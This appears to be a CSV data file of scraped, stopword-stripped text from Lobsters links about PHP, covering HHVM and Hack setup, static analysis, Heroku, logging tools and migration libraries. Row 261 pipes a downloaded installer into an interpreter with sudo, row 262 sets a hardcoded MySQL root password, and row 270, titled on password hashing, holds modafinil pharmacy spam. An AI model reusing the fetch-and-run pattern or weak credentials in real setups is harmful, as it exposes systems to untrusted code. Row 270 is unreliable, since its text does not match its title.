254,Lobsters,php,PHP programming,Aggregate System and Application Logs with Papertrail,http://longren.io/aggregate-system-and-application-logs-with-papertrail/,aggregate system application log papertrail,frustrationfree log management papertrail papertrail suggest give try well work get touch leave feedback leave comment like published twitter google github view post tyler longren published,frustrationfree log management using papertrail month absolutely love able search log across server crazy nice even get alert someone log via ssh made papertrail well worth nonproduction server compromised due sincerectified configuration issue papertrail notified almost immediately allowing immediate action taken variety pricing plan even free life plan includes plenty feature folk currently free plan plan upgrading soon adding server need extra space papertrail loading addition collecting log server also send log application got php application erroring reason send error papertrail later investigation deal apache log mysql log pretty much every piece software generates log many limit configure papertrail powerful suggest give try installation super easy especially using rsyslog screenshot installation instruction get much easier well work available hire always taking new client big small got project idea like discus startup plan developer make happen get touch love see help leave feedback got question updated information releavant post please leave comment comment great way get help read reply nearly every comment let talk like like loading related published tyler longren hi tyler longren freelance web developer father two beautiful daughter car stereo enthusiast like php javascript wordpress git neat thing really love open source community find twitter google github personal blog view post tyler longren published april
255,Lobsters,php,PHP programming,Review of PHP Static Analysis Tools,http://blog.codacy.com/2014/05/06/php-static-analysis-tools/,review php static analysis tool,static analysis tool help developer php static analysis tool choose code sniffer code sniffer zend pear fig group documentation several output format phpmd php mess detector php depend documentation php copypaste detector phpcpd automatic code fix php coding standard fixer phpcbf testsphp patched file phpdepend metric phploc security advisory checker one choose workflow codacy conclusion ultimate guide code review page codacy get started,performing php static analysis help maintain code quality time particularly becomes even harder large project developed many programmer person different code style different way approach problem time may result confusing unmaintainable code static analysis tool help developer solve problem enforce coding standard detect common error cleanup code block blog post take look common code standard tool used php static analysis show improve code quality maintainability integrated development process tool start using today free make sure check php development php static analysis tool choose code sniffer code sniffer arguably popular tool enforce strict style guide php code ship support popular coding standard zend pear among others psr standard family used people nowadays created fig group looking standard adopt good option code sniffer also allows create coding standard case necessary feeling adventurous take look documentation example output generated code sniffer phpcs testsphp reportfull file testsphp found error warning affecting line warning line exceeds character contains character warning line exceeds character contains character error class must namespace least one leve error class name foofoo camel cap format error method name foofoo barbar camel cap error class must file error class must namespace least one leve error x expected newline end file found error x closing tag permitted end file phpcbf fix marked sniff violation automatically see code sniffer show detailed summary detected code violation several output format want le humanreadable report parsing purpose output xml csv data recently even introduced option output blame report showing percentage error introduced developer although code sniffer also prevent common semantic error main focus enforcing code standard tool better support semantic error detection none beat code sniffer come strictly following code standard phpmd php mess detector multi faceted static analysis php tool based php depend kind problem detected phpmd divided main category code sizeanalyses code complexity warns project starting become unmanageable define threshold maximum class length method length cyclomatic complexity etc designdetects software design related issue use eval goto exit excessive coupling etc namingensures variable class name method name appropriate long short using good name crucial person reading code underestimate analysis controversiala rule naming convention best practice apply every project unuseddetects block unused code cleaned example phpmd output phpmd testsphp text ruleset class foofoo named camelcase property myproperty named camelcase avoid unused parameter avoid unused parameter barbar access superglobal variable post method barbar named camelcase avoid unused local variable somename method barbar parameter consider reduce parameter number avoid unused local variable somename ruleset xml file contains list inspection want enable include main category even specify rule used within category information create file check documentation overall phpmd highly customisable static analyser although enforce specific code standard use clean code detect possible bug manage complexity project php copypaste detector phpcpd small tool created sebastian bergmann detect clone project short example phpcpd phpcpd sebastian bergmann found exact clone duplicated line file duplicated line total line code time m memory control verbosity output minimum number linestokens considered clone repeated code hide repeated bug therefore keep percentage duplicated line low possible refactoring clone single method class automatic code fix tool go beyond error detection try automatically patch code php coding standard fixer suggests fix according coding standard specified following example list problem found two file phpcsfixer fix dryrun foophp phpclosingtag eofending barphp brace functiondeclaration eofending phpcbf script also fix error automatically ship latest version code sniffer run simply like phpcbf testsphp patched file tool tool worth checking would like mention first one phpdepend generates impressive set metric project code package dependency cyclomatic complexity coupling etc easily detect part application need refactored phploc also show interesting statistic project powerful phpdepend also get interesting overview code size complexity number class etc finally security advisory checker tool sensio lab check security vulnerability composer dependency match composerlock file database known security vulnerability alert issue found one choose ultimately personal choice depending need project working probably want combine one tool cover wide range possible error ensure code remains clean consistent example configure code sniffer style guide use along php mess detector enforce consistency time detect hot spot project unusually complex code unused code section short variable name etc top always add tool complement analysis copy paste detector example workflow take static analysis need integrate development cycle use tool independently forget time several way directly idesome editor php storm sublime text already plugins support static analysis tool install configure everything receive warning suggestion type avoid later bug fix make write better code start precommit hookif ide support preferred tool want stricter rule regarding commits adhere specification write precommit hook git solution automatically abort commit process error found analysis online analysisfinally want simple way analyse code without manually configure everything locally use online code review service codacy shameless plug already integrate mentioned detection tool article working everyday improve service main benefit using tool like codacy allow monitor issue time detect new fixed issue one commit time conclusion php impressive set good tool statically analyse code guide development enforce strict standard manage complexity detect semantic problem undeniably great help tackle maintainability issue large software project team developing php without give try let know go comment published ebook ultimate guide code review based survey developer enjoy check page review static analysis tool different coding language codacy codacy used thousand developer analyze billion line code every day getting started easy free use github bitbucket google account sign get started
256,Lobsters,php,PHP programming,Building Secure PHP Apps,http://buildsecurephpapps.com,building secure php apps,pdf epub digitally watermarked drmfree isbn,pdf mac pc epub ipad iphone android ebook reader digitally watermarked drmfree isbn
257,Lobsters,php,PHP programming,"Scaling PHP Book - Scale LAMP, PHP, MySQL Easily",https://www.scalingphpbook.com/,scaling php book scale lamp php mysql easily,apache cry sleep everynight learn perfect php stack lhnmprr,everything ever learned scaling slept infront laptop year scaling twitpic rolling restart apache drifting back sleep startup nt single point failure imagine scaling nt frustrating could get back best shipping code going teach scale php stop playing sysadmin get back coding nt sign put fire figuring scale mysql nt exactly going ship feature faster know learning intricaces mycnf waste time nt another choice book get crashcourse every important tuning option matter quick formula figure perfect setting hardware bliss apache cry sleep everynight heard alot nginx horizontal scaling thousand tutorial quality range abysmal must joke finally find good one usually rail know like scramble around reading bad advice stackoverflow copyandpasting config file message board hope one finally work pulling hair swearing screen nt way single highquality resource information scaling php thing right way actually focused php rail nodejs flavor week something taught scalable architecture thing might run user nt mom learn perfect php stack lhnmprr okay okay nothing ever catchy lamp master new scalable stack called lhnmprr linux haproxy nginx mysql php redis resque scale throwing hardware able finally get setup perfect using battle tested stack proven handle billion request think cheat code php php also see exact configuration technology used proven massive billion http request per month thousand mysql query per basically metrictruck ton visitor
258,Lobsters,php,PHP programming,Introducing the new PHP on Heroku,https://blog.heroku.com/archives/2014/4/29/introducing_the_new_php_on_heroku,introducing new php heroku,listen article town please join u tonight heroku helped create buildpack trivial switch composer symfony laravel heroku introduced xl,listen article php developer maker heart core strength php always creating tight feedback cycle developer audience strength reason php power many world biggest best web property facebook etsy developer similar apps know php always enjoyed runtime management infrastructure element peer community like ruby rail python django node time one web largest php shop facebook advocate innovator language hard php developer beyond facebook wall take advantage innovation fortunate work facebook variety occasion conference next door office san francisco thought would great opportunity help bring php community latest innovation developer everywhere announcing today full heroku support new php town please join u tonight preconference php meetup office right next door main venue new php built new runtimes framework marrying familiarity productivity popular language best practice modern framework letting php developer take favorite language ever new php perfectly suited modern development deployment heroku helped create available today specifically heroku making available public beta today foundation new php facebook hiphop vm modern highperformance runtime php promise order magnitude speed improvement retaining compatibility help facebook team vm available part heroku buildpack developer quickly deploy php code onto new vm would rail python specifying running traditional vm hhvm trivial switch php apps heroku declarative explicit dependency management core facet building apps new world ensures clean development pipeline ease onboarding new developer project parity development production closer thus making running production apps easier form structured dependency management available heroku supported language year php via composer copied best breed new php brings many new framework symfony laravel bring forward new type development together dependency management newer framework help better deliver apps brought market quickly also maintained scaled predictable fashion today heroku enhancement php take advantage benefit heroku introduced xl offering complete path company deploy scale php high scale high performance context px dyno compatibility brings even greater performance php apps running heroku coupling hhvm support delivers performance even highest scale site premium support php developer enterprise deploy php apps confidence x technical resource available enough talk though let give try first let create standard hello world application indexphp file php echo hello world going create composerjson file case empty using dependency application touch composerjson finally let commit git create heroku application deploy git init initialized empty git repository helloherokuphpgit git add git commit initial import hello heroku master rootcommit initial import hello heroku file changed insertion create mode composerjson create mode indexphp heroku create creating done stack cedar http git herokucom git push heroku master heroku open working php app like thank much community helping drive much innovation php creator composer facebook team working hhvm look forward seeing build new php support heroku welcome feedback comment dig
260,Lobsters,php,PHP programming,How to Learn Computer Programming,http://www.jeremymorgan.com/blog/programming/how-to-start-programming-for-free/,learn computer programming,tip getting started get money learn text editor visual studio want build part web development backend server side web development linux stack note advantage using linux stack everything free linux developer community open source fun disadvantage linux stack many large company use microsoft stack fragmentation abandoned project lack documentation sometimes thing work microsoft stack advantage microsoft stack backed large successful company ecosystem big business love solid tool disdvantages microsoft stack backed large successful company expensive dreamspark bizspark web hosting common harder learn aspnet aspnet frontend client side web development general programming development summary,want computer programmer want write software get started awesome hobby profession right away next nothing first wrote article back lot changed since decided start completelylast update getting startedif narrow two thing ultimately determine success get money know software job pay well saying try get best pay possible built skill primary reason want get bother two approach programming want learn write software build blank solve blank maybe someday paid iti want make money becoming software developerthe first one really way go honest developer take intense commitment beyond imagine going many skilled profession reach mastery remain employable decade even rest life software one base knowledge development grows last decade applicable skill much smaller shelf life must study improve craft time take dedication passion money simply providethose get purely money tend get disgruntled fail keep trend new technology burn eventually also constantly compete truly learn text editorwhether html assembler writing plain text way learn understand going program must break development environment start hacking awaywhen learn coding ide integrated development environment many shortcut autocompletes mask really going build thing quickly really know happening itwrite hand watch break fix worth timei even recommend c asp learning visual studio arguably best ide ever created help beginner learned c notepad cscexe experience use visual studio every day beginner would hampered learninguse text editor first learn ide thank laterwhat want build first choice must make approaching development stick choice forever start somewhere category software development start ever one excited web developmentdesktop developmentmobile developmentserver developmentthese broken even always niche category bios programming data processing specialization area going tackle seriespart web developmentok time make another decision basic route go need decide stack going least first linux stackmicrosoft stackthere advantage disadvantage outline herethen must decide web development want focus least firstfrontend web development page design gui stuff seebackend web development database apis behind scene stuffthere reason learn frontend backend linux microsoft stack fact take considerable amount time accomplish best pick one area focus firstbackend server side web developmentlinux stackthe linux stack set technology generally used linux operating system platform though technology run window well generally better supported linux hosting much better tooling debugging linux environmentsnote need run linux development machine write software help give try advantage using linux stackeverything free paying hosting may even tool free many tool use develop also free great getting foot wet programmingthe linux developer community linux o choice many developer passionate development helping others starting find ton activity world lot help onlineit open source project find linux open source meaning dig code really see work make change fix problem share source code freely internet philosophy drastically changed programming made software far betterit fun though microsoft net developer living still use linux time writing arch linux laptop constant tinkerer heart love change tweak everything also love optimize environment peak result squeeze lot performance hardware linuxdisadvantages linux stackmany large company use microsoft stack microsoft net framework robust mature stable platform development also mesh well microsoft product used heavily business world work one company want work primarily microsoft linux skill helpful give yet many large company using linux well mix bothfragmentation downside everyone thing becomes fragmented certain technology mesh well together might standard way using piece software far different othersabandoned project many abandoned project realm people group together work something get bored infighting lack interest community happens software dead something useful good someone may pick fork guarantee remember people working free lack documentation something seems improving day project lack good documentation struggle get thing working people free pay anything really expect support help however sharing everything learn itsometimes thing work find software package work missing key feature since commercial backing may le motivation fix edge case special need may enough demand anyone care opportunity become better developer pitch fix thing add featuresthis includes many platform list mostlythese predominant web language net awesome way language relatively easy learn great resource also offer great framework ready build large scale applicationsmicrosoft stackthe microsoft stack organized ecosystem revolving around microsoft product bad thing explain true ecosystem everything designed work together part consists net frameworkc vbnettypescriptaspnet combination technologiesnote aspnet incorporating language language php python ruby part right majority microsoft web development still revolves around technology language listed aboveadvantages microsoft stackit backed large successful company know microsoft whether love hate pretty successful mean lot resource talent throw stuff recent year huge push get developer realm improvement astoundingit ecosystem many developer argue whether good thing environment interconnected everything designed play well together set standard best practice established way thing find fragmented environmentbig business love backing microsoft solid standard reliable structure attract big business net ecosystem many company like fact rely technology help phone call away also like fact microsoft reputation liable releasing product case test thing thoroughly released wildit solid faster scaleable platform linux world price development faster net application rock solid built correctly thing like strong typing excellent debugging profiling tool picky compiler vast knowledgebase contribute quality software people rely build solid software linux net development push build great code default try harder build sloppy software platformthe tool tool ridiculously good net development visual studio ide unmatched opinion development environment debugging profiling tool help squeeze every bit performance security hobbyist get express version tool freedisdvantages microsoft stackit backed large successful company disadvantage ecosystem built around company surface often time project get adopted enough generate number die quick death thing done company best interest every programmer agrees think microsoft evil popular younger hipper programming crowdsit expensive running microsoft shop lot advantage come cheap dissuade lot smaller company startup using disadvantage rectified little known program student get software free dreamspark startup use bizsparkto get software freeweb hosting common throw rock without hitting linux based web host good asp host much harder find host asp either expensive outdated neglectedit harder grab quick book php slap together website couple day great personal blog recipe site asp lot learn lot finicky lot aggregate thing learn environment much strict need learn well also incorporate lot computer science related thinking building exactly bad thing daunting beginnersso still want keep reading learn aspnetaspnet combination microsoft language technology related web funny enough website aspnet fantastic resource learning rope place go learn morec predominant language net backend programming highly recommend learning vbnet easier learn well suited scaling object oriented programming c f microsoft functional language still beginning stage great solution case typescript microsoft language scaleable enterprise javascriptfrontend client side web developmentanyone say frontend development real programming done day javascript robust complex ever providing solid functionality used plain web page fact frontend development fastest growing arena probably best place go futurehere need know scratch surface comprises frontend development stride made every day many framework developed make frontend development web mobile device powerful evergeneral programming developmentfor general programming development knowledge following site great getting nice foundation software developmentsummaryi hope given enough information getting started computer programming since teenager get paid still seems like fun rewarding challenging field get intoyou might asking earth creating competition asked several time blog general answer simple enough u developer job increasing faster amount people fill see opportunity people better life especially developing country someone interested developer happy help outlet know think comment contact
261,Lobsters,php,PHP programming,Building a Better PHP — Part 2: Using HHVM,http://ey.io/1oUWylM,building better php part using hhvm,using hhvm part one series composer composer numerous tweet note note setting web server zend framework note phpunit using fastcgi unix socket scheduled march note coming,using hhvm continuing part one series working hhvm environment start use something practical phpinfo composer one first thing today improve workflow start using hhvm composer noted numerous tweet make composer run faster use le resource standalone process easy switch away phpnet importantly switch back thing go awry first let start installing composer hhvm default http request timeout want change setting change need set httpslowquerythreshold configuration option set serverhdf config affecting request adding http slowquerythreshold via command line using v flag using php flag emulate php cli flag hhvm v hhvm php note may require higher threshold depending internet connection install couple dependency sudo aptget install curl git unzip install composer simply curl s http getcomposerorginstaller sudo hhvm php sudo mv composerphar usrlocalbincomposer us php flag allow u pipe composer installer code directly hhvm next setup alias composer allow u run via hhvm set two network configuration variable alleviate issue slower connection additionally set evaljitfalse jit beneficial longrunning process used cli would case composer cause hhvm startup slower alias composer hhvm v v v evaljitfalse usrlocalbincomposer make permanent add line bashrc run source bashrc run composer setup project using example zend framework skeleton application composer createproject prefersource zendframeworkskeletonapplication devmaster note got errorexception undefined variable inputstream however completed successfully nonetheless setting web server zend framework next update nginx hhvm server configuration point document root nginx edit etcnginxsitesavailablehhvmconf change following two line root inside location blockfastcgiparam scriptfilename fastcgiscriptname hhvm change serversourceroot configuration sourceroot next restart service sudo service nginx restart sudo service hhvm restart note prior hhvm init script ubuntu least broken instead use sudo killall hhvm sudo service hhvm start restart access web server browser see default skeleton application start develop new application phpunit another common task improved switching hhvm running unit test first install phpunit using composer composer global require complete installation add following alias bashrc run source bashrc alias phpunithhvm v evaljitfalse homevagrantcomposervendorbinphpunit phpunit command run via hhvm like composer want run test suite running following cd composer install cd test phpunit using fastcgi unix socket next version hhvm scheduled march see support fastcgi unix socket unix socket theory perform better tcp socket easy use choose make change sure benchmark change ensure actually seeing performance increase resource usage decrease use unix socket need change server configs hhvm change etchhvmserverini like hhvmserverport varrunhhvmserversock nginx change etcnginxsitesavailablehhvmconf location hhphp fastcgipass fastcgipass unix varrunhhvmserversock restart daemon service hhvm restart service nginx restart note use feature must install current nightly build vagrantfile default coming well overview using hhvm replace phpnet two practical application hhvm put use immediately next part series take indepth look hack feature brings table well review might mean phpnet tried hhvm yet experience think hhvm far let u know comment
262,Lobsters,php,PHP programming,Building a Better PHP with HHVM and Hack: Part 1,http://ey.io/1lTljNn,building better php hhvm hack part,release hack hhvm brief history hiphop hhvm v phpnet environment impact found generator arrayof sara golemon extension zephir phpcpp mongofill hhvmnative interface hni hhvm documentation extension api hack note xhp extension installing hhvm vagrant vm running hhvm serverhdf serverini note hhvm cloud php stack coming today,official release hack hhvm today facebook thought would good idea take look hhvm hack detail facebook probably largest php installation planet yet recent year turned away favor homegrown solution point even call php shop answer lie somewhere absolutely crazy brief history hiphop facebook initially created hphpc php c compiler would translate huge codebase c code compile process took long time hour gave performance gain negative impact developer even bigger alongside facebook also created hphpi developer mode require compiling entire codebase every time hphpd debugger hphpc way success facebook giving necessary performance gain allow scale beyond previous ability hardware built php could support subset language example support dynamic function created using createfunction dreaded eval order move forward something new needed facebook released first public version hiphop virtual machine hhvm deprecated hphpc sibling favor fastperforming time compiler jit took php code compiled machine code fly initial release hhvm almost compatible php continues add support new language feature php mantra hear team behind hhvm bugforbug parity could create perfect php implementation trying recreate edgecases oddity php language migration path easier said committed fixing actual bug phpnet possible fix without breaking backwards compatibility huge way see facebooks effort achieve parity comparing popular open source test suite result hhvm phpnet hhvm v phpnet hhvm faster much faster lot case speed everything people focus performance improvement hhvm phpnet primary differentiator definitely thing consider environment impact carbon though given fact hhvm drastically reduce number server therefore power requirement argument made impact technical environment release hhvm added support fastcgi interface mean currently using phpfpm hhvm effectively dropin additionally possible run phpnet hhvm simultaneously simply routing request different fastcgi proxy sysadmins using ubuntu debian fedora package available directly hhvm team one biggest pain point developer lack ide support specifically debugging may also allow set hhvm binary inplace php binary running command line script thing like phpunit perhaps biggest deficiency point however lack support standard php extension mean use pecl extension probably work hhvm box team actively trying implement common extension however making great progress list currently available extension found believe hhvm fragment php community certainly possibility however hhvm team actively involved least trying contribute back phpnet example feature first implemented hhvm later php generator added php another example recent rejected rfc arrayof syntax overlapped heavily generic supported hhvm hack language later hhvm team via sara golemon participated heavily discussion around extension hugely renewed interest php extension lately tool like zephir phpcpp possibly spurred success hhvm undoubtedly maturation community enterprise space last decade hhvm long extension wrap cc library simply write php hack hhvm good job compiling machine code fast faster writing thing c example community contributed mongofill mongo extension replacement hhvm case need drop c hhvm provides hhvmnative interface hni allows stub function phphack write implementation c full detail implementing extension hhvm see hhvm documentation extension api hack people think hhvm alternative php runtime additionally runtime facebooks language known hack best described syntactical sibling php support number new feature scalar type hinting argument return value generic collection constructor argument promotion besides hack supported alongside standard php syntax major feature fact developer tool paired hhvm static analysis tool get realtime information thing like type mismatch additionally allows hhvm make informed decision compiling code however compiled hack php code identical far hhvm concerned hack hhvm great place trial new potential feature php general hope see lot great feature back ported phpnet future yes possibly ungoogleable name ever hack code start hh open tag rather standard php open tag use closing tag hack interspersed html like regular php great separation concern support native xhtml firstclass syntax note xhtml syntax added phpnet using xhp extension hhclass calculator public function add int left int right int return left right calc new calculator calc add calc add one three fatal error running result fatal error fatal error argument passed calculator add must instance int string given file line hhvms static analysis tool error found without even running code even noncommon code path see hack part series installing hhvm installing hhvm easy booting vagrant vm simply place following vagrantfile vagrantfileapiversion vagrantconfigure vagrantfileapiversion config use ubuntu lts configvmbox configvmnetwork publicnetwork create bridge network install hhvm configvmprovision shell inline shell aptget update aptget install pythonsoftwareproperties forceyes addaptrepository ppa mapnikboost wget http dlhhvmcomconfhhvmgpgkey sudo aptkey add echo deb http dlhhvmcomubuntu precise main sudo tee etcaptsourceslistdhhvmlist aptget update aptget install hhvmnightly forceyes aptget install screen vim forceyes debconfsetselections mysqlserverrootpassword password pa debconfsetselections mysqlserverrootpasswordagain password pa aptget install mysqlserver forceyes shellend vagrantfile ready go simply issue vagrant command wait machine boot able ssh using vagrant ssh play hhvm running hhvm hhvm installed simply call using hhvm command example assuming calculator class calcphp might run addition simple command line usage two way run hhvm web first builtin server way run hhvm recently second option fastcgi added use hhvm fastcgi need sit behind web server like nginx similar phpfpm install simply sudo aptget install nginx sudo mkdir varwww sudo chown vagrant daemon varwww next add new nginx config file etcnginxsitesavailablehhvmconf server servername hhvmdev root varwww index indexphp location hhphp fastcgipass fastcgiindex indexphp fastcgiparam scriptfilename varwww fastcgiscriptname include fastcgiparams install place default sudo rm etcnginxsitesenableddefault sudo ln etcnginxsitesavailablehhvmconf etcnginxsitesenabledhhvmconf sudo service nginx restart next setup hhvm run fastcgi updating etchhvmserverhdf etchhvmserverini current nightlies config file serverhdf server port type fastcgi sourceroot varwww log level error uselogfile true file varloghhvmerrorlog access file varloghhvmaccesslog format h l u r b repo central path varloghhvmhhvmhhbc serverini php optionspid varrunhhvmpid hhvm specifichhvmserverport fastcgihhvmserversourceroot varwwwhhvmserverdefaultdocument indexphphhvmloglevel errorhhvmloguselogfile truehhvmlogfile varloghhvmerrorloghhvmrepocentralpath varrunhhvmhhvmhhbc restart start hhvm note prior hhvm recent nightlies init script ubuntu least broken instead use sudo killall hhvm sudo service hhvm start restart finally add indexphp webroot varwww access web server get ip calling ifconfig case hhvm output simply hhvm cloud engine yard constantly track new technology tracking hhvm closely year excited seeing yet support hhvm stack working hard integrate php stack hhvm cloud mean better utilization cloud resource allowing stretch budget le coming next part series look practical application hhvm start using today even ready move codebase
264,Lobsters,php,PHP programming,LLOOGG realtime log analyzer web app released as opensource from Antirez (redis),https://github.com/antirez/lloogg,lloogg realtime log analyzer web app released opensource antirez redis,lloogg realtime log analyzer web app http demollooggcom closed code completely embarassing served redis test bed code bad install lloogg use lloogg gpl,lloogg realtime log analyzer web app llogg web service salvatore sanfilippo cofounder fabio pitrola ran seven year free started side project different thing company wrote code matter day tried put online see reaction site concept simple addictive lloogg display access web site happen pretty raw format one first service type ever created back later modified order track adsense click feature later removed available source release basically instructive see user web site make able capture pattern hard capture aggregated data processed google analytics want see service running use demodemo username password http demollooggcom website allow user register copy ran friend closed code put online user started jump report totally addicted service unfortunately already stuff fabio new thing moved barcelona writing redis exactly lloogg scalable using mysql experience stimulated think different kind database later applied lloogg good success long story short port mysql redis little thing service remained running without change year lloogg lightweight phpredis application able process billion pageviews connected site year since migration redis single cheap virtual machine still cost running dollar per month many year started annoy fabio discontinued service however still user wanted use lloogg even code completely embarassing decided release served redis test bed yep theory least lloogg web site one applying redis directly considerable traffic command per second shut running always redis unstable release lloogg order catch bug put release production user reality single redis bug found using lloogg ran always like oil crash latency issue nothing real benefit point majority issue redis discovered user using redis much bigger scale code bad couple reason code written spare time casual way started fork another web site developed back early terrible coding practice ported mysql redis logic minimal change part lameness code redis limited port performed hash example code us redis suboptimal way client library raw well connection redis created every page view however good thing code well internals javascript pretty ugly managed run year seeing generation new browser mobile device without incompatibility also simple design mess confident good programmer able modify matter minute release removed ten useless function found inside code hope least avoid confusing reader total garbage install lloogg lloogg pure phpredis application without dependency afaik old version php probably even php install unpack code web root setup redis server copy localconfigphpexample localconfigphp edit localconfigphp put redis host port edit configphp set domain name username admin user edit ljs go end file see imgsrchttp llooggcomrecvphpargs replace llooggcom domain name use lloogg visit web site root create account get javascript tag put web site see visit real time appearing lloogg app still distinguish pro normal account since idea adopt freemium business model log admin account setup configphp set pro account pro account longer persistent history also app feature let gain readonly access account pro account monitor multiple website free account monitor single one gpl nt like gpl license normally time wanted see change merged back code kind service lloogg reason ported source code open source release
266,Lobsters,php,PHP programming,PHP Development Stack,http://weavora.com/blog/2013/03/24/2013-the-development-stack-for-your-next-startup/,php development stack,primary tool github plan pricing article php performance improvement phpstorm symfony propel orm composer phpunit behat mink developing web application behat mink important symfony component twig assetic monolog swiftmailer jmssecurityextrabundle fosjsroutingbundle javascript backbonejs coffeescript nodejs underscorejs le qunit momentjs jquery highcharts typical server software stack nginx mysqlpercona redis newrelic percona toolkit gearman,lot entrepreneur often ask u question technology stack build startup around guy propose one trendy frameworkslibstools startup need use fact right wrong answer question decision every company make depending trying create usually based skill background cofounder moreover working pretty complex project probably use whole bunch tool optimized effectively solve specific problem ie choice development stack based problem solve need meet post going emphasize php one major platform large variety technology certainly come php primary technology team last year successfully completed dozen complex highly loaded system verified practice effectiveness particular tool given situation try describe basic important tool use typical project primary tool perhaps start saying keep code github see plan pricing recently written article convenience benefit anyone interested read php latest stable version contains performance improvement compared ide picked phpstorm zendstudio eclipse others multiple reason provides easiesttouse debugging solution handy way run unit test within ide really unstoppable come performance symfony latest stable version highperformance php framework including many highquality componentsbundles following uptodate coding standard propel orm fast orm framework allows access database using set object provides simple api storing retrieving data composer tool managing packagecomponent dependency word declare dependent library project need composer install project phpunit tool method testing verifies individual unit smallest testable code source code working properly behat mink tool behaviordriven functional testing behat describe anything describe business logic see developing web application behat mink important symfony component twig template engine provides opportunity make php objectbased le messy make code cleaner easier maintain understand assetic asset management framework php define compress build etc monolog sends log file socket inboxes database various web service swiftmailer mail engine offering flexible elegant objectoriented approach sending email multitude feature jmssecurityextrabundle help define access rule fosjsroutingbundle export route javascript javascript backbonejs javascript framework allowing easily create single page web application flexible incredibly lightweight think need explain building something without structure bad idea coffeescript let clearly express program lot le code javascript also make accomplishing many common task much easier employ classbased approach creating object javascript generally prototypical confuses hell people nodejs give opportunity handle thousand concurrent connection minimum processing overhead underscorejs utilitybelt library javascript le amazing little tool extends cs variable mixins operation nested rule mean write cleaner code quickly qunit provides simple rather unique approach test driven development javascript momentjs excellent library working date javascript jquery anything web development probably heard term jquery million time already highcharts many javascriptbased charting component particularly enjoy using javascript library typical server software stack nginx web server focus high concurrency performance low memory usage php fastcgi adaptor give opportunity scale based load number php process running handling request fast integrates well nginx mysqlpercona enhanced replacement mysql redis high performance nosql storage used advanced cache engine newrelic managed service saas plug web app tool collect aggregate performance stats live web product information provides help find answer question like website slow slow slow exactly need bigger server improvement percona toolkit collection advanced commandline tool perform variety mysql server system task including analyzing query collecting vital system information etc gearman allows application perform task parallel distribute processing job separate process machine machine cluster balance processing load even invoke code written language using pro con success story welcome
267,Lobsters,php,PHP programming,Run PHP in the browser or Node.js,http://asmblah.github.io/uniter/demo/interactive.html,run php browser nodejs,uniter,uniter nb uniter alpha stage currently support small subset php feature
268,Lobsters,php,PHP programming,Clever testrunner for PHPUnit,https://github.com/lstrojny/phpunit-clever-and-smart/,clever testrunner phpunit,clever test runner phpunit mission installation configuration roadmap,clever test runner phpunit mission enable fast feedback cycle storing test case result database reorder test consecutive run following order failure error far unrecorded test remaining test execution time ascendant order fastest first probably yet stable try run test suite error phpunit sebastian bergmann fsfs rerun test suite see previous failing test sorted beginning test run phpunit sebastian bergmann fsfs installation add following line project composerjson requiredev section lstrojnyphpunitcleverandsmart configuration play around add phpunitxml dist listener listener class phpunitrunnercleverandsmarttestlistener argument object class argument listener listener might alter location sqlite storage file passing path class listener listener class phpunitrunnercleverandsmarttestlistener argument object class argument string mypathtophpunitcasdb string argument object argument listener listener roadmap test many test suite possible stabilize merge phpunit core
269,Lobsters,php,PHP programming,Gannet - a simple database migration tool,https://github.com/laurent22/gannet,gannet simple database migration tool,gannet database migration tool php work usage config file comment command line parameter advanced usage accessing config variable script running script running script file upgrading database using one migration file error handling configsampletoml todo,gannet database migration tool php database migration tool manages run set migration script flexibility library force write migration script particular language require learn new set instruction simply ensures file executed correct order database date individual script file although php fact work database server long php executable installed work library requires migration table called dbmigrations default contains current version database version assumed default add migration script usually sql file script folder file named like target version eg etc run gannet look folder run script current version done migration table updated new version number usage clone repository folder server create migration table using script configmigrationtable copy configconfigsampletoml configconfigtoml set database connection setting also likely need update commandsql section command line see config file comment information add migration script script folder named like target database version eg etc version number three digit xxx run migration tool php gannetphp command line parameter optionally script take path configuration file parameter allows different configuration different environment example php gannetphp configconfiglocaltoml php gannetphp configconfiglivetoml advanced usage accessing config variable script running script gannet set environment variable based current configuration file variable currently set gannetconnectionusername gannetconnectionpassword gannetconnectionhostname gannetconnectiondatabase correpond variable connection section config file usually needed variable accessed using whatever feature scripting language provide example getenv gannetconnectionusername get database username php running script may automatically run script running migration specifying script file extension nt matter named beforephp beforepy etc script useful example put site maintainance mode running migration one could used clear cache cleaning task running script file usually database upgrade done running sql file complex migration also run script file add new commandxxx section configtoml xxx file extension example go php sh etc define command line run script file using command parameter example would run php go script commandsphp command optlamppbinphpcgi file successcode commandsgo command go run file successcode upgrading database using one migration file one script file must run given database upgrade split migration several file example might sql file add table database php script dynamically populate database case simply split upgrade two versioned file library automatically run correct order error handling default migration process stop whenever error happens migration script specify error code given command line use successcode parameter see configsampletoml detail todo add support rollback
270,Lobsters,php,PHP programming,"Password Hashing in PHP, The Right Way™",http://www.longren.org/password-hashing-in-php-the-right-way/,password hashing php right,read,modafinil medication used treat sleepiness caused narcolepsy may experiencing sleep disorder due shift work lead interruption sleep different time medication developed help management obstructive sleep apnea necessary enough sleep body read morebuy modafinil online trusted source
271,Lobsters,php,PHP programming,Input Filtering & Validation with Aura.Filter,http://websec.io/2013/12/31/Input-Filtering-Validation-Aura-Filter.html,input filtering validation aurafilter,input filtering validation aurafilter please note date post aura framework paul jones aurafilter getting installed require least php composer github note first step validation first step filtering closure filtering versus validating word warning always trust resource chris training consulting service,input filtering validation aurafilter please note article code reference date aurafilter project changed dramatically world pretty obvious one major security issue web application language effective filtering validation data using external source could coming number place including database outside apis worst user bad data could anything come form badly formatted text someone copy pasted way something malicious wouldbe attacker regardless come intent data filtering validation handled roughly way mentioned post filtering based whitelisting blacklist ensuring data using expected clean possible several php library help solve particular issue one want cover library part framework relatively new scene aura framework project originally started paul jones one main tenant primary goal aura provide highquality welltested standardscompliant decoupled library used code base mean use much little project like framework adopted componentmodular mentality structure aura framework built ground way aim reusable component least amount dependency possible used independently without much work since talking data validation filtering going focus one particular package aurafilter package provides filtering validation despite name make simpler check data getting installed get far example sample code let get installed aura framework package bit bleeding edge php development right require least php functionality us use composer method always download latest release github require aurafilter run composerphar install good go kind configuration file need make file change get started using note version library may changed since posting article sure release number composerjson file latest greatest first step validation simple usage component get idea flow going start simple string validation php requireonce vendorautoloadphp filter requireonce vendoraurafilterscriptsinstancephp filter addsoftrule testing filter strlenmin filter addhardrule testing filter alnum object object array testing h filter value object true printr filter getmessages else echo valid example setting filter object using handy instancephp script come package assigning validation rule testing property object two rule check ensure value alphanumeric least character long string h fails check value method called object filter rule applied true false returned overall status false returned one check failed resulting error message fetched getmessages method two thing explain example really quickly first concept rule type example two soft rule defined soft rule permissive nt stop processing rest filter still make validation fail nt break flow end 